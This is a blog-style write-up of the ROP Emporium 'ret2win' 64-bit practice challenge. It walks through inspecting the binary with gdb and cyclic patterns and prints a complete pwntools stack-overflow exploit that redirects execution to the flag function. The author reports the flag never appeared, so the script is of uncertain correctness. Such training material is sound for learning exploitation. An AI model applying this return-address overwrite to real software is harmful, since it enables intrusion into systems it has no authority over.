This is a writeup on the ROP Empourioum challenge Ret2Win.
I will be doing this series in the span of this week , so stay tuned for more writeups.
The challenge is a 64-bit binary. Lets begin.

So I downloaded the binary from [ROP](https://ropemporium.com/binary/ret2win.zip) and unziped.

![list](/post-images/ret2win64/List.png)

I then ran the ret2win through a file ***forgot to performa a checksec I'll remember next time***. I did a cat on the ret2win file but all I got was gibberish, so I never bothered.
But I remembered to perform a strings later on in the working out.

![file](/post-images/ret2win64/02file.png)

![strings](/post-images/ret2win64/08strings.png)

I then did a crude opration run on the binary to see if I could get a feeling of the basics of the challenge.
I ran the binary and it gave me a prompt to enter my input, and the input was sanitized by the **read()** function.
I first did a basic input to see the outcome.

![run](/post-images/ret2win64/03run.png)

I then opened gdb using pwndbg and checked the functions available in the binary. This can also be done using **Ghidra**.

![gdb](/post-images/ret2win64/04gdb.png)

Ran a `cyclic` command to get random characters that I would use as input for my binary.
```
cyclic 100
```
![cyclic](/post-images/ret2win64/05cyclic.png)

I then ran the binary with the cyclic input and it gave me a segmentation fault. The code ran and because it "broke" it redirected me to the `pwnme` function rather than the desired `ret2win` function.

![segfault](/post-images/ret2win64/06runandbreak.png)

![pwnme](/post-images/ret2win64/07returnspwnme.png)

here is the pwnme redirect.

Since we have the address to the ret2win function, I created a pwntools template exploit to get to the address of the ret2win function which hosts the flag.

**NOTE:** ***You must have `pwn` already installed in your machine to get this template or you can search for it online.***
```
pwn template
```
![pwntemp](/post-images/ret2win64/09pwntemplate.png)

Here is the template exploit I created:
```python
from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './ret2win'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Print out the target address
info("%#x target", elf.symbols['ret2win'])

# We will send a 'cyclic' pattern which overwrites the return
# address on the stack.  The value 128 is longer than the buffer.
payload = cyclic(128)

# PWN
io.sendlineafter('>', payload)

# Wait for the process to crash
io.wait()

# Open up the corefile
core = io.corefile

# Print out the address of RSP at the time of crashing (SP for ARM)
stack = core.rsp
info("%#x stack", stack)

# Read four bytes from RSP, which will be some of our cyclic data.
# With this snippet of the pattern, we know the exact offset from
# the beginning of our controlled data to the return address.
pattern = core.read(stack, 4)
info("%r pattern", pattern)

# Print out the address of EIP at the time of crashing
rip_offset = cyclic_find(pattern)
info('located RIP offset at {a}'.format(a=rip_offset))

# Craft a new payload which puts the "target" address at the correct offset
payload = fit({
    pattern: elf.symbols.ret2win
})

# Send the payload to a new copy of the process
io = start()
io.sendline(payload)
io.recv()

# Get our flag!
flag = io.recvline()
success(flag)

```
I ran the script and it compiled successfully and I got the message to the flag but not the flag clearly.

![flag](/post-images/ret2win64/11flag.png)

I think its an error cause I also created a bin file and storeed it there but there was no flag still, If any one can know what the issue is please reach out. Thank you


